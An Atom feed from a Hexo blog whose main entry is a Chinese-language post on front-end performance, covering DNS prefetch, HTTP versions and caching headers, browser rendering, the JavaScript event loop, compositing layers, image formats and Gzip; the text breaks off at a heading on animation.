<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>swing</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://swingboy.github.io/"/>
  <updated>2020-04-27T14:17:57.669Z</updated>
  <id>http://swingboy.github.io/</id>
  
  <author>
    <name>火柴人</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>react性能优化</title>
    <link href="http://swingboy.github.io/2020/01/24/react%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://swingboy.github.io/2020/01/24/react性能优化/</id>
    <published>2020-01-24T06:56:12.000Z</published>
    <updated>2020-04-27T14:17:57.669Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于前端性能优化的一些事</title>
    <link href="http://swingboy.github.io/2019/12/10/%E5%85%B3%E4%BA%8E%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B/"/>
    <id>http://swingboy.github.io/2019/12/10/关于前端性能优化的一些事/</id>
    <published>2019-12-10T12:25:37.000Z</published>
    <updated>2020-05-12T07:05:38.293Z</updated>
    
    <content type="html"><![CDATA[<p>前端性能优化零碎知识点的一些东西，可能相对比较不太成”体统“简单理下，零碎的但必要的知识点。从“输入 URL 到页面加载完成，发生了什么”的角度简单梳理一遍</p><ul><li>DNS 解析</li><li>TCP 连接</li><li>HTTP 请求发送</li><li>服务端处理请求，响应返回</li><li>浏览器拿到响应数据，解析响应内容，把解析的结果展示给用户</li></ul><p>稍微详细点儿：</p><ul><li>回车url到cpu中断，响应键盘操作</li><li>浏览器解析url到开启网络请求线程</li><li>DNS解析域名映射对应的ip地址（及arp地址解析，实现IP地址到MAC地址的转换。）</li><li>开启网络线程到发出一个完整的http请求</li><li>从服务器接收到请求到对应后台接收到请求</li><li>后台和前台的http交互</li><li>浏览器接收到http数据包后的解析流程（解析html-词法分析然后解析成dom树、解析css生成css规则树、合并成render树，然后layout、painting渲染、复合图层的合成、GPU绘制、外链资源的处理、loaded和domcontentloaded等）</li><li>JS引擎解析过程（JS的解释阶段，预处理阶段，执行阶段生成执行上下文，VO，作用域链、回收机制等等）</li></ul><h2 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h2><p>我们知道dns解析是耗时的。</p><p>对于页面请求域名，如果DNS Lookup 时间过长会引起白屏的时间过长<br>对于图片对应的域名，如果DNS Lookup 时间过长，白图的时间也会过长</p><p>如果解析域名过多，会让首屏加载变得过慢。</p><p>dns解析成IP，大致流程：</p><p>如果浏览器有缓存，直接使用浏览器缓存，否则使用本机缓存，再没有的话就是用host<br>如果本地没有，就向dns域名服务器查询（中间可能还会经过路由器、ISP 的缓存），查询到对应的IP</p><ul><li>域名查询时有可能是经过了CDN调度器的（如果有cdn存储功能的话）</li></ul><h2 id="DNS优化"><a href="#DNS优化" class="headerlink" title="DNS优化"></a>DNS优化</h2><p>DNS Prefetch，即DNS预解析就是根据浏览器定义的规则，提前解析之后可能会用到的域名，使解析结果缓存到系统缓存中，缩短DNS解析时间，来提高网站的访问速度。</p><ul><li>当然还有设置合理的TTL时间、DNS多点就近部署架构升级、基于Anycast的DNS解析架构（未来DNS的优化方向）</li></ul><p><strong><em> 打开和关闭DNS预读取  </em></strong> </p><p>可以通过在服务器端发送 X-DNS-Prefetch-Control 报头，或是在文档中使用值为 http-equiv 的标签：<br>&lt;meta http-equiv=”x-dns-prefetch-control” content=”off”&gt;</p><p>强制查询特定主机名<br>你可以通过使用 rel 属性值为 link type 中的 dns-prefetch 的 标签来对特定域名进行预读取：<br>&lt;link rel=”dns-prefetch” href=”<a href="http://www.xxx.com/&quot;" target="_blank" rel="noopener">http://www.xxx.com/&quot;</a>&gt;</p><h2 id="HttpDNS"><a href="#HttpDNS" class="headerlink" title="HttpDNS"></a>HttpDNS</h2><p>我们知道，DNS一定会存在的问题就是：域名更新问题、解析延迟。那HTTPDns就登场了</p><ul><li>定义：不走传统的DNS解析，而是自己搭建基于HTTP协议的DNS服务器集群，分布在多个地点和多个运营商，当客户端需要DNS解析的时候，直接通过HTTP协议进行请求这个服务器集群，获得就近的地址。</li></ul><p>HttpDNS是通过ip直接请求http获取服务器A记录地址，不存在向本地运营商询问domain解析过程，所以从根本避免了劫持问题。同时由于是ip直接访问省掉了一次domain解析过程，可以在一定程度上降低平均访问延迟。</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>http耗时 = TCP握手 通过三次握手建立连接（四次挥手）<br>https耗时 = TCP握手 + SSL握手</p><p>http请求过程（请求应答模式）：<br>第一次: CLIENT—-syn—–&gt;SERVER<br>第二次: SERVER—-ack,syn—-&gt;CLIENT<br>第三次: CLIENT—-ack—–&gt;SERVER<br>这样，从client—-&gt;server, server—-&gt;client各自通过一次syn,ack形成闭环，理论上形成了一个近似可靠的通信。</p><p>类似于TCP的三次握手，四次挥手的四步：<br>Client—fin,ack—&gt;Server<br>Server—ack—-&gt;Clinet<br>Server—fin,ack—&gt;Client<br>Client—-ack—–&gt;Server</p><ul><li>SYN：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</li><li>ACK (Acknowledgement）即是确认字符，在数据通信中，接收站发给发送站的一种传输类控制字符。表示发来的数据已确认接收无误。<br>在TCP/IP协议中，如果接收方成功的接收到数据，那么会回复一个ACK数据。通常ACK信号有自己固定的格式,长度大小,由接收方回复给发送方。</li></ul><h2 id="http1-0、1-1、2-0区别与联系"><a href="#http1-0、1-1、2-0区别与联系" class="headerlink" title="http1.0、1.1、2.0区别与联系"></a>http1.0、1.1、2.0区别与联系</h2><p>http1.1与http1.0 的最大区别就是：长链接、节约带宽、HOST域<br>与性能相关的是：长链接。HTTP 1.0需要使用keep-alive参数来告知服务器端要建立一个长连接，而HTTP1.1默认支持长连接。<br>节约带宽：HTTP 1.1支持只发送header信息(不带任何body信息)，如果服务器认为客户端有权限请求服务器，则返回100，否则返回401。客户端如果接受到100，才开始把请求body发送到服务器。这样当服务器返回401的时候，客户端就可以不用发送请求body了，节约了带宽。另外HTTP还支持传送内容的一部分。这样当客户端已经有一部分的资源后，只需要跟服务器请求另外的部分资源即可。这是支持文件断点续传的基础。</p><p>哪怕如此，HTTP1.1还是存在效率问题。单个 TCP 连接在同一时刻只能处理一个请求，是说：两个请求的生命周期不能重叠，任意两个 HTTP 请求从开始到结束的时间在同一个 TCP 连接里不能重叠。（虽然有了管道机制pipelining，在同一个TCP链接里，客户端可以发送多个请求，但是服务器还是按照顺序，先回应前面的，完成后，在回应后面的）</p><p>问题一：串行的文件传输。当请求a文件时，b文件只能等待，等待a连接到服务器、服务器处理文件、服务器返回文件，这三个步骤。我们假设这三步用时都是1秒，那么a文件用时为3秒，b文件传输完成用时为6秒，依此类推。（注：此项计算有一个前提条件，就是浏览器和服务器是单通道传输）<br>问题二：连接数过多。我们假设Apache设置了最大并发数为300，因为浏览器限制，浏览器发起的最大请求数为6，也就是服务器能承载的最高并发为50，当第51个人访问时，就需要等待前面某个请求处理完成。</p><p>然后http2.0 来了 解决这些问题</p><p>解决第一个：在HTTP1.1的协议中，我们传输的request和response都是基本于文本的，这样就会引发一个问题：所有的数据必须按顺序传输，比如需要传输：hello world，只能从h到d一个一个的传输，不能并行传输，因为接收端并不知道这些字符的顺序，所以并行传输在HTTP1.1是不能实现的。</p><ul><li>HTTP/2引入二进制数据帧和流的概念，其中帧对数据进行顺序标识，这样浏览器收到数据之后，就可以按照序列对数据进行合并，而不会出现合并后数据错乱的情况。同样是因为有了序列，服务器就可以并行的传输数据，这就是流所做的事情。</li></ul><p>解决第二个问题：HTTP/2对同一域名下所有请求都是基于流，也就是说同一域名不管访问多少文件，也只建立一路连接。同样Apache的最大连接数为300，因为有了这个新特性，最大的并发就可以提升到300，比原来提升了6倍！</p><p>综上HTTP1.1与HTTP 2.0的主要区别</p><ul><li>多路复用</li><li>二进制分帧</li><li>首部压缩</li><li>服务器推送</li></ul><p>HTTP 2.0 采用 HTTPS ，HTTPS 基于 SSL/TLS。现在绝大部分的站点都会采用https，也就会引入hsts。</p><p>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。HSTS 的作用是为了在用户通过 HTTP 访问网站时不需要服务器做 301/302 跳转，直接一个 307 本地强制使用 HTTPS 访问网站，这可以防止用户在第一次发出请求时被劫持，也减少了一次请求。</p><h2 id="https过程"><a href="#https过程" class="headerlink" title="https过程"></a>https过程</h2><p>如何如何加密、解密。对称与非对称加密，证书如何生成</p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>nginx实现负载均衡的几种方式</p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h3 id="http-缓存"><a href="#http-缓存" class="headerlink" title="http 缓存"></a>http 缓存</h3><p>缓存可以简单的划分成两种类型：强缓存（200 from cache）与协商缓存（304）<br>优先级较高的是强缓存，在命中强缓存失败的情况下，才会走协商缓存。</p><p>强缓存是利用 http 头中的 Expires 和 Cache-Control 两个字段来控制的。强缓存中，当请求再次发出时，浏览器会根据其中的 expires 和 cache-control 判断目标资源是否“命中”强缓存，若命中则直接从缓存中获取资源，不会再与服务端发生通信。</p><p>协商缓存依赖于服务端与浏览器之间的通信。协商缓存机制下，浏览器需要向服务器去询问缓存的相关信息，进而判断是重新发起请求、下载完整的响应，还是从本地获取缓存的资源。如果服务端提示缓存资源未改动（Not Modified），资源会被重定向到浏览器缓存，这种情况下网络请求对应的状态码是 304</p><p>罗列下一些header 头</p><h4 id="http1-0中："><a href="#http1-0中：" class="headerlink" title="http1.0中："></a>http1.0中：</h4><p>Pragma：严格来说，它不属于专门的缓存控制头部，但是它设置no-cache时可以让本地强缓存失效（属于编译控制，来实现特定的指令）<br>Expires：（expires: Wed, 11 Sep 2017 13:20:20 GMT）expires 是一个时间戳，接下来如果我们试图再次向服务器请求资源，浏览器就会先对比本地时间和 expires 的时间戳，如果本地时间小于 expires 设定的过期时间，那么就直接去缓存中取这个资源。 （expires对应服务器端时间）<br>If-Modified-Since/Last-Modified：<br>属于协商缓存的内容，其中浏览器的头部是If-Modified-Since，而服务端的是Last-Modified，它的作用是，在发起请求时，如果If-Modified-Since和Last-Modified匹配，那么代表服务器资源并未改变，因此服务端不会返回资源实体，而是只返回头部，通知浏览器可以使用本地缓存。（精确到1s以内）</p><h4 id="http1-1中"><a href="#http1-1中" class="headerlink" title="http1.1中"></a>http1.1中</h4><p>Cache-Control：缓存控制头部，有no-cache、max-age、no-store、public、private、s-maxage等多种取值</p><ul><li>Max-Age：服务端配置的，用来控制强缓存，在规定的时间之内，浏览器无需发出请求，直接使用本地缓存，（max-age=3600，而且它值得是绝对时间，由浏览器自己计算）</li><li>no-cache绕开了浏览器：我们为资源设置了no-cache 后，每一次发起请求都不会再去询问浏览器的缓存情况，而是直接向服务端去确认该资源是否过期（即走我们下文即将讲解的协商缓存的路线）</li><li>no-store比较绝情，顾名思义就是不使用任何缓存策略。在no-cache的基础上，它连服务端的缓存确认也绕开了，只允许你直接向服务端发送请求、并下载完整的响应。</li><li>public 可向任意方提供相应的缓存。如果我们为资源设置了 public，那么它既可以被浏览器缓存，也可以被代理服务器缓存</li><li>private 仅向特点用户返回相应。如果我们设置了 private，则该资源只能被浏览器缓存。</li><li>s-maxage 公共缓存服务器相应的最大age值。s-maxage 就是用于表示 cache 服务器上（比如 cache CDN）的缓存的有效时间的（s-maxage仅在代理服务器中生效，客户端中我们只考虑max-age。）<br>当然还有其他的类似must-revalidata、proxy-revalidate</li></ul><p>If-None-Match/E-tag: 这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是If-None-Match，而服务端的是E-tag.发出请求后，如果If-None-Match和E-tag匹配，则代表内容未变，通知浏览器使用本地缓存，和Last-Modified不同，E-tag更精确，它是类似于指纹一样的东西，基于FileEtag INode Mtime Size生成，也就是说，只要文件变，指纹就会变，而且没有1s精确度的限制。</p><p><strong><em> Max-Age相比Expires</em></strong><br>Expires使用的是服务器端的时间.但是有时候会有这样一种情况-客户端时间和服务端不同步.那这样，可能就会出问题了，造成了浏览器本地的缓存无用或者一直无法过期<br>所以一般http1.1后不推荐使用Expires.而Max-Age使用的是客户端本地时间的计算，因此不会有这个问题,因此推荐使用Max-Age。(如果同时启用了Cache-Control与Expires，Cache-Control优先级高。)</p><p><strong><em> E-tag相比Last-Modified </em></strong></p><p>Last-Modified：表明服务端的文件最后何时改变的,它有一个缺陷就是只能精确到1s，然后还有一个问题就是有的服务端的文件会周期性的改变，导致缓存失效<br>E-tag：是一种指纹机制，代表文件相关指纹,只有文件变才会变，也只要文件变就会变，也没有精确时间的限制，只要文件一遍，立马E-tag就不一样了(如果同时带有E-tag和Last-Modified，服务端会优先检查E-tag)</p><p><img src="/imgs/关于前端性能优化的一些事/huancun.jpeg" alt></p><p>如何选择：<br><img src="/imgs/关于前端性能优化的一些事/image.png" alt></p><h3 id="页面解析"><a href="#页面解析" class="headerlink" title="页面解析"></a>页面解析</h3><p>浏览器内核拿到内容后，渲染步骤大致可以分为以下几步：</p><ol><li>解析HTML，构建DOM树</li><li>解析CSS，生成CSS规则树</li><li>合并DOM树和CSS规则，生成render树</li><li>布局render树（Layout/reflow），负责各元素尺寸、位置的计算（从根节点递归调用，计算每一个元素的大小、位置等）</li><li>绘制render树（paint），绘制页面像素信息。（在这一步中浏览器会根据我们的 DOM 代码结果，把每一个页面图层转换为像素，并对所有的媒体文件进行解码。）</li><li>浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上</li></ol><h3 id="HTML解析，构建DOM"><a href="#HTML解析，构建DOM" class="headerlink" title="HTML解析，构建DOM"></a>HTML解析，构建DOM</h3><p>渲染树（Render-Tree）的关键渲染路径中，要求同时具有 DOM 和 CSSOM，之后才会构建渲染树。即，HTML 和 CSS 都是阻塞渲染的资源。<br>减少DOM元素的数量、而且尽量少用iframe更要杜绝404</p><h3 id="解析CSS"><a href="#解析CSS" class="headerlink" title="解析CSS"></a>解析CSS</h3><p>CSS下载时异步，不会阻塞浏览器构建DOM树.但是会阻塞渲染，也就是在构建render时，会等到css下载解析完毕后才进行（这点与浏览器优化有关，防止css规则不断改变，避免了重复的构建）<br>CSS 是阻塞渲染的资源。需要将它尽早、尽快地下载到客户端，以便缩短首次渲染的时间。</p><ul><li>media query声明的CSS是不会阻塞渲染的</li></ul><p>精简 CSS 并尽快提供它.除此之外，还可以用媒体类型（media type）和媒体查询（media query）来解除对渲染的阻塞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;link href=&quot;index.css&quot; rel=&quot;stylesheet&quot;&amp;gt;</span><br><span class="line">&amp;lt;link href=&quot;print.css&quot; rel=&quot;stylesheet&quot; media=&quot;print&quot;&amp;gt;</span><br><span class="line">&amp;lt;link href=&quot;other.css&quot; rel=&quot;stylesheet&quot; media=&quot;(min-width: 30em) and (orientation: landscape)&quot;&amp;gt;</span><br></pre></td></tr></table></figure></p><p>保持简单，不要使用嵌套过多过于复杂的选择器。<br>通配符和属性选择器效率最低，需要匹配的元素最多，尽量避免使用。<br>不要使用类选择器和ID选择器修饰元素标签，如h3#markdown-content，这样多此一举，还会降低效率。<br>不要为了追求速度而放弃可读性与可维护性。<br>不要使用@import<br>尽量减少使用昂贵属性，如box-shadow/border-radius/filter/透明度/:nth-child等</p><p>CSS方法论BEM9，OOCSS10，SUIT11，SMACSS12，ITCSS13，Enduring CSS14等</p><p><strong><em>选择器优先级：</em></strong></p><p>选择器类型<br>下面列表中，选择器类型的优先级是递增的：</p><ul><li>1.类型选择器（例如，h1）和伪元素（例如，::before）</li><li>2.类选择器 (例如，.example)，属性选择器（例如，[type=”radio”]）和伪类（例如，:hover）</li><li>3.ID 选择器（例如，#example）。</li></ul><p>通配选择符（universal selector）（*）关系选择符（combinators）（+, &gt;, ~, ‘ ‘, ||）和 否定伪类（negation pseudo-class）（:not()）对优先级没有影响。（但是，在 :not() 内部声明的选择器会影响优先级）。<br>给元素添加的内联样式 (例如，style=”font-weight:bold”) 总会覆盖外部样式表的任何样式 ，因此可看作是具有最高的优先级。</p><p>总结：<br>important 》内联-》id 》class = 属性 = 伪类 》标签 = 伪元素 》 通配符（*）<br>important声明 1,0,0,0<br>ID选择器 0,1,0,0<br>类选择器 0,0,1,0<br>伪类选择器 0,0,1,0<br>属性选择器 0,0,1,0<br>标签选择器 0,0,0,1<br>伪元素选择器 0,0,0,1<br>通配符选择器 0,0,0,0</p><p>1、为什么一再强调css放在头部 ？<br>其实现代浏览器为了更好的用户体验,渲染引擎将尝试尽快在屏幕上显示的内容。它不会等到所有HTML解析之前开始构建和布局渲染树。部分的内容将被解析并显示。也就是说浏览器能够渲染不完整的dom树和cssom，尽快的减少白屏的时间。假如我们将js放在header，js将阻塞解析dom，dom的内容会影响到First Paint，导致First Paint延后。所以说我们会将js放在后面，以减少First Paint的时间，但是不会减少DOMContentLoaded被触发的时间。</p><p>2、css 逆向匹配为什么会提高匹配效率？<br>HTML 结构变复杂，CSS 规则表变庞大，那么，逆向匹配的优势就远大于正向匹配了，因为匹配的情况远远低于不匹配的情况。另外，如果在选择器结尾加上通配符「*」，那么「逆向匹配」的优势就大打折扣了，这也就是很多优化原则提到的「尽量避免在选择器末尾添加通配符」的原因。</p><h3 id="js-引擎的解析流程"><a href="#js-引擎的解析流程" class="headerlink" title="js 引擎的解析流程"></a>js 引擎的解析流程</h3><p>JS脚本资源的处理有几个特点：</p><ul><li>阻塞浏览器的解析，也就是说发现一个外链脚本时，需等待脚本下载完成并执行后才会继续解析HTML</li><li>浏览器的优化，一般现代浏览器有优化，在脚本阻塞时，也会继续下载其它资源（当然有并发上限），但是虽然脚本可以并行下载，解析过程仍然是阻塞的，也就是说必须这个脚本执行完毕后才会接下来的解析，并行下载只是一种优化而已</li></ul><p>所以，不管外链还是内部脚本，都应当尽量放在页面底部。</p><p>前面有提到遇到JS脚本时，会等到它的执行，实际上是需要引擎解析的</p><p>但是可以加上defer或async属性，这样脚本就变成异步的了，可以等到解析完毕后再执行</p><ul><li>defer与async的区别是：defer要等到整个页面在内存中正常渲染结束（DOM 结构完全生成，以及其他脚本执行完成），才会执行；async一旦下载完，渲染引擎就会中断渲染，执行这个脚本以后，再继续渲染。</li><li>即：defer是“渲染完再执行”，async是“下载完就执行”。</li><li>另外，如果有多个defer脚本，会按照它们在页面出现的顺序加载，而多个async脚本是不能保证加载顺序的。</li><li>注意 async 与 defer 属性对于 inline-script 都是无效的。</li></ul><p>js引擎对JS的处理过程：</p><ul><li><ol><li>读取代码，进行词法分析（Lexical analysis），然后将代码分解成词元（token）</li></ol></li><li><ol start="2"><li>对词元进行语法分析（parsing），然后将代码整理成语法树（syntax tree）</li></ol></li><li><ol start="3"><li>使用翻译器（translator），将代码转为字节码（bytecode） </li></ol></li><li><ol start="4"><li>使用字节码解释器（bytecode interpreter），将字节码转为机器码</li></ol></li></ul><h4 id="JS的解释阶段"><a href="#JS的解释阶段" class="headerlink" title="JS的解释阶段"></a>JS的解释阶段</h4><p>JS是解释型语言，所以它无需提前编译，而是由解释器实时运行<br>为了提高运行速度，现代浏览器一般采用即时编译（JIT-Just In Time compiler）  </p><p>即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）这样整个程序的运行速度能得到显著提升。</p><p>而且，不同浏览器策略可能还不同，有的浏览器就省略了字节码的翻译步骤，直接转为机器码（如chrome的v8）<br>总结起来可以认为是： 核心的JIT编译器将源码编译成机器码运行</p><h4 id="预处理阶段"><a href="#预处理阶段" class="headerlink" title="预处理阶段"></a>预处理阶段</h4><p>1、分号补全<br>2、变量提升<br>3、…</p><h3 id="JS的执行阶段"><a href="#JS的执行阶段" class="headerlink" title="JS的执行阶段"></a>JS的执行阶段</h3><p>整个执行流程中大致包含以下几个重要部分：</p><ul><li>执行上下文，执行堆栈（如全局上下文，当前活动上下文）</li><li>VO（变量对象）和AO（活动对象）</li><li>作用域链</li><li>this机制</li></ul><p>减少闭包释放内存资源</p><p>求值策略：<br>“传值调用”（call by value）<br>“传名调用”（call by name）</p><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>常用的两种垃圾回收规则</p><ul><li>标记清除</li><li>引用计数</li></ul><p>Javascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除）</p><ul><li>遍历所有可访问的对象，回收已不可访问的对象。</li></ul><p>need to do<br>降低内存泄露的风险<br>设置定时器的回收<br>dom元素的回收<br>事件的回收<br>卸载组件之后对应内存的释放<br>通过WeakMap(其中的键是弱引用的。其键必须是对象，而值可以是任意的)解决内存泄漏问题</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包是指有权访问另外一个函数作用域中的变量的函数.可以理解为(能够读取其他函数内部变量的函数)</p><p>作用: 正常函数执行完毕后,里面声明的变量被垃圾回收处理掉,但是闭包可以让作用域里的变量,在函数执行完之后依旧保持没有被垃圾回收处理掉。</p><ul><li>应用闭包的主要场合是：设计私有的方法和变量。</li></ul><p>缺陷：闭包的缺点就是常驻内存会增大内存使用量，并且使用不当很容易造成内存泄露。如果不是因为某些特殊任务而需要闭包，在没有必要的情况下，在其它函数中创建函数是不明智的，因为闭包对脚本性能具有负面影响，包括处理速度和内存消耗。</p><p>适当减少闭包的使用。</p><h2 id="event-loop"><a href="#event-loop" class="headerlink" title="event loop"></a>event loop</h2><p>微任务，宏任务。理解事件循环机制，巧用宏任务与微任务。</p><p>Event Loop 过程浅析</p><ul><li>Javascript 有一个 main thread 主线程和 call-stack 调用栈(执行栈)，所有的任务都会被放到调用栈等待主线程执行。</li></ul><p>JS 调用栈</p><ul><li>JS 调用栈是一种后进先出的数据结构。当函数被调用时，会被添加到栈中的顶部，执行完成之后就从栈顶部移出该函数，直到栈内被清空。</li></ul><p>同步任务、异步任务</p><ul><li>js 单线程中的任务分为同步任务和异步任务。同步任务会在调用栈中按照顺序排队等待主线程执行，异步任务则会在异步有了结果后将注册的回调函数添加到任务队列(消息队列)中等待主线程空闲的时候，也就是栈内被清空的时候，被读取到栈中等待主线程执行。任务队列是先进先出的数据结构。<br>Event Loop</li><li>调用栈中的同步任务都执行完毕，栈内被清空了，就代表主线程空闲了，这个时候就会去任务队列中按照顺序读取一个任务放入到栈中执行。每次栈内被清空，都会去读取任务队列有没有任务，有就读取执行，一直循环读取-执行的操作，就形成了事件循环。</li></ul><h2 id="Flush-队列"><a href="#Flush-队列" class="headerlink" title="Flush 队列"></a>Flush 队列</h2><p>现在浏览器，不会在每次 DOM 操作都即时地反馈一次回流或重绘。它自己缓存了一个 flush 队列，把我们触发的回流与重绘任务都塞进去，待到队列里的任务多起来、或者达到了一定的时间间隔，再将这些任务进行出队。</p><p>回流（Reflow）与重绘（Repaint）</p><p>documentFragment（DocumentFragment 接口表示一个没有父级文件的最小文档对象。它被当做一个轻量版的 Document 使用，用于存储已排好版的或尚未打理好格式的XML片段。因为，DocumentFragment 不是真实 DOM 树的一部分，它的变化不会引起 DOM 树的重新渲染的操作（reflow），且不会导致性能等问题。）<br>document.createDocumentFragment（创建document fragment）</p><h3 id="回流"><a href="#回流" class="headerlink" title="回流"></a>回流</h3><p>页面初始化<br>DOM结构改变<br>窗口resize<br>render树变化<br>浏览器为了获得某些值会触发回流  </p><ul><li>offset(Top/Left/Width/Height)</li><li>scroll(Top/Left/Width/Height)</li><li>cilent(Top/Left/Width/Height)</li><li>width,height</li><li>调用了getComputedStyle()或者IE的currentStyle（getComputedStyle，因为它需要获取祖先节点的一些信息进行计算（譬如宽高等））</li><li>…</li></ul><h2 id="简单层与复合层"><a href="#简单层与复合层" class="headerlink" title="简单层与复合层"></a>简单层与复合层</h2><p>简介：<br>可以认为默认只有一个复合图层，所有的DOM节点都是在这个复合图层下的<br>如果开启了硬件加速功能，可以将某个节点变成复合图层<br>复合图层之间的绘制互不干扰，由GPU直接控制<br>absolute布局（fixed也一样），虽然可以脱离普通文档流，但它仍然属于默认复合层。<br>而简单图层中，就算是absolute等布局，变化时不影响整体的回流，但是由于在同一个图层中，仍然是会影响绘制的，因此做动画时性能仍然很低。而复合层是独立的，所以一般做动画推荐使用硬件加速<br>尽量不要大量使用复合图层，否则由于资源消耗过度，页面反而会变的更卡</p><p>硬件加速时请使用index<br>使用硬件加速时，尽可能的使用index，防止浏览器默认给后续的元素创建复合层渲染</p><p>具体的原理：</p><ul><li>webkit CSS3中，如果这个元素添加了硬件加速，并且index层级比较低，</li><li>那么在这个元素的后面其它元素（层级比这个元素高的，或者相同的，并且releative或absolute属性相同的），</li><li>会默认变为复合层渲染，如果处理不当会极大的影响性能</li></ul><p><strong><em> 简单点理解，其实可以认为是一个隐式合成的概念：如果a是一个复合图层，而且b在a上面，那么b也会被隐式转为一个复合图层，这点需要特别注意 </em></strong></p><p>如何变成复合图层（硬件加速）?<br>将该元素变成一个复合图层，就是传说中的硬件加速技术<br>最常用的方式：translate3d、translateZ</p><p>opacity属性/过渡动画（需要动画执行的过程中才会创建合成层，动画没有开始或结束后元素还会回到之前的状态）<br>will-chang属性,一般配合opacity与translate使用（而且经测试，除了上述可以引发硬件加速的属性外，其它属性并不会变成复合层），作用是提前告诉浏览器要变化，这样浏览器会开始做一些优化工作（这个最好用完后就释放）</p><p>video、iframe、canvas、webgl等元素、flash插件</p><ul><li>Chrome源码调试 -&gt; More Tools -&gt; Rendering -&gt; Layer borders中看到，黄色的就是复合图层信息</li></ul><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>遇到图片等资源时，直接就是异步下载，不会阻塞解析，下载完毕后直接用图片替换原有src的地方</p><p>JPEG<br>特点：有损压缩、体积小、加载快、不支持透明<br>适用场景：JPG 适用于呈现色彩丰富的图片，在我们日常开发中，JPG 图片经常作为大的背景图、轮播图或 Banner 图出现。<br>缺陷：处理矢量图形和 Logo 等线条感较强、颜色对比强烈的图像时，人为压缩导致的图片模糊会相当明显,而且不支持透明</p><p>PNG-8 与 PNG-24<br>特点：无损压缩、质量高、体积大、支持透明<br>适用场景：呈现小的 Logo、颜色简单且对比强烈的图片或背景等。<br>缺陷：大</p><p>SVG<br>特点：文本文件、体积小、不失真、兼容性好。</p><ul><li>SVG 与 PNG 和 JPG 相比，文件体积更小，可压缩性更强。<br>缺点：渲染成本比较高。SVG 是可编程的，学习成本。</li></ul><p>Base64<br>特点：文本文件、依赖编码、小图标解决方案</p><ul><li>Base64 并非一种图片格式，而是一种编码方式</li><li>Base64 是一种用于传输 8Bit 字节码的编码方式，通过对图片进行 Base64 编码，我们可以直接将编码结果写入 HTML 或者写入 CSS，从而减少 HTTP 请求的次数。<br>适用场景：小图<br>缺点：Base64 编码后，图片大小会膨胀为原文件的 4/3（这是由 Base64 的编码原理决定的。大的图片不建议使用</li></ul><p>WebP<br>特点：WebP 像 JPEG 一样对细节丰富的图片信手拈来，像 PNG 一样支持透明，像 GIF 一样可以显示动态图<br>缺点：WebP 还会增加服务器的负担——和编码 JPG 文件相比，编码同样质量的 WebP 文件会占用更多的计算资源。兼容问题</p><p>如何做图片加载异常处理？<br>逐步加载图像？</p><h2 id="服务端渲染"><a href="#服务端渲染" class="headerlink" title="服务端渲染"></a>服务端渲染</h2><p>优势：首屏优化，seo<br>缺点:过多占用服务端资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &#123; renderToString &#125; from &apos;react-dom/server&apos;</span><br><span class="line">renderToString(&lt;Sth /&gt;)</span><br></pre></td></tr></table></figure><h2 id="Gzip-压缩"><a href="#Gzip-压缩" class="headerlink" title="Gzip 压缩"></a>Gzip 压缩</h2><p>Gzip 的内核就是 Deflate，目前我们压缩文件用得最多的就是 Gzip。<br>如果项目不是极端迷你的超小型文件，都建议试试Gzip。</p><ul><li>压缩 Gzip，服务端要花时间；解压 Gzip，浏览器要花时间。中间节省出来的传输时间，真的那么可观吗？</li></ul><p>答案是肯定的。如果你手上的项目是 1k、2k 的小文件，那确实不值当。但更多的时候，我们处理的都是具备一定规模的项目文件。实践证明，这种情况下压缩和解压带来的时间开销相对于传输过程中节省下的时间开销来说，可以说是微不足道的。</p><h2 id="懒加载、预加载"><a href="#懒加载、预加载" class="headerlink" title="懒加载、预加载"></a>懒加载、预加载</h2><p>图片：<br>懒加载，把图片用占位符，把真正的路径存在元素“data-url”属性里。<br>预加载，提前加载图片，当用户需要查看时可直接从本地缓存中渲染。</p><h2 id="动画"><a href="#动画" class="headerlink" 